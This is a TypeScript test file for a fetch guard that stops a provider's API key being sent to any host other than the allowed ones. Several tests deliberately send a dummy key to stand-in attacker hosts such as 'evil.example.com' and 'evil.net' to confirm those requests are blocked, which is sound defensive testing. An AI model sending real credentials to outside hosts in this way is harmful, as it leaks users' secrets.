import { ProviderError } from '@vc/pipeline';
import { describe, expect, it } from 'vitest';
import { guardedFetch, isLoopbackHost } from './guard';
import { createFakeFetch, jsonResponse } from './testing/fake-fetch';

const KEY = 'sk-guard-test-0123456789abcdef';

const setup = (allowedHosts: string[], allowHttpLocalhost = false) => {
  const fake = createFakeFetch(() => jsonResponse({ ok: true }));
  const fetch = guardedFetch(fake.fetch, {
    providerId: 'acme',
    apiKey: KEY,
    allowedHosts,
    allowHttpLocalhost,
  });
  return { fake, fetch };
};

const blocked = async (promise: Promise<unknown>) => {
  await expect(promise).rejects.toBeInstanceOf(ProviderError);
  await promise.catch((error: ProviderError) => {
    expect(error.code).toBe('key_host_mismatch');
    expect(error.message).not.toContain(KEY);
  });
};

describe('guardedFetch: the backend only ever sends a key to the provider it belongs to', () => {
  it('lets a keyed request through to an allowed host', async () => {
    const { fake, fetch } = setup(['api.acme.com']);
    await fetch('https://api.acme.com/v1/x', { headers: { authorization: `Bearer ${KEY}` } });
    expect(fake.requests).toHaveLength(1);
  });

  it('refuses before sending when the key is in a header for another host', async () => {
    const { fake, fetch } = setup(['api.acme.com']);
    await blocked(
      fetch('https://evil.example.com/v1/x', { headers: { authorization: `Bearer ${KEY}` } }),
    );
    expect(fake.requests).toHaveLength(0);
  });

  it('checks the URL (query-string keys), raw and URL-encoded', async () => {
    const { fake, fetch } = setup(['serpapi.com']);
    await blocked(fetch(`https://serpapi.com.evil.net/search?api_key=${encodeURIComponent(KEY)}`));
    await blocked(fetch(`https://evil.net/search?api_key=${KEY}`));
    await fetch(`https://serpapi.com/search?api_key=${encodeURIComponent(KEY)}`);
    expect(fake.requests).toHaveLength(1);
  });

  it('checks string and URLSearchParams bodies', async () => {
    const { fetch } = setup(['api.acme.com']);
    await blocked(
      fetch('https://other.com', { method: 'POST', body: JSON.stringify({ key: KEY }) }),
    );
    await blocked(
      fetch('https://other.com', { method: 'POST', body: new URLSearchParams({ key: KEY }) }),
    );
  });

  it('checks Request objects and Headers instances too', async () => {
    const { fetch } = setup(['api.acme.com']);
    await blocked(
      fetch(new Request('https://other.com', { headers: new Headers({ 'x-api-key': KEY }) })),
    );
  });

  it('matches hosts exactly, not by suffix or prefix', async () => {
    const { fetch } = setup(['acme.com']);
    await blocked(fetch('https://api.acme.com', { headers: { 'x-api-key': KEY } }));
    await blocked(fetch('https://notacme.com', { headers: { 'x-api-key': KEY } }));
  });

  it('requires https for cloud providers', async () => {
    const { fetch } = setup(['api.acme.com']);
    await blocked(fetch('http://api.acme.com/v1', { headers: { 'x-api-key': KEY } }));
  });

  it('allows plain http only to loopback hosts of local providers', async () => {
    const local = setup(['localhost', '127.0.0.1'], true);
    await local.fetch('http://localhost:11434/v1/chat/completions', {
      headers: { authorization: `Bearer ${KEY}` },
    });
    await local.fetch('http://127.0.0.1:1234/v1/models', {
      headers: { authorization: `Bearer ${KEY}` },
    });
    expect(local.fake.requests).toHaveLength(2);
    const lan = setup(['192.168.1.20'], true);
    await blocked(
      lan.fetch('http://192.168.1.20:11434/v1', { headers: { authorization: `Bearer ${KEY}` } }),
    );
  });

  it('passes requests that carry no key straight through', async () => {
    const { fake, fetch } = setup(['api.acme.com']);
    await fetch('https://anywhere.example.org/page');
    expect(fake.requests).toHaveLength(1);
  });

  it('does nothing when there is no key', async () => {
    const fake = createFakeFetch(() => jsonResponse({}));
    const fetch = guardedFetch(fake.fetch, { providerId: 'local', apiKey: null, allowedHosts: [] });
    await fetch('http://localhost:11434/v1');
    expect(fake.requests).toHaveLength(1);
  });

  it('recognises loopback hosts', () => {
    expect(isLoopbackHost('localhost')).toBe(true);
    expect(isLoopbackHost('127.0.0.1')).toBe(true);
    expect(isLoopbackHost('127.9.9.9')).toBe(true);
    expect(isLoopbackHost('[::1]')).toBe(true);
    expect(isLoopbackHost('::1')).toBe(true);
    expect(isLoopbackHost('localhost.evil.com')).toBe(false);
    expect(isLoopbackHost('10.0.0.1')).toBe(false);
  });
});
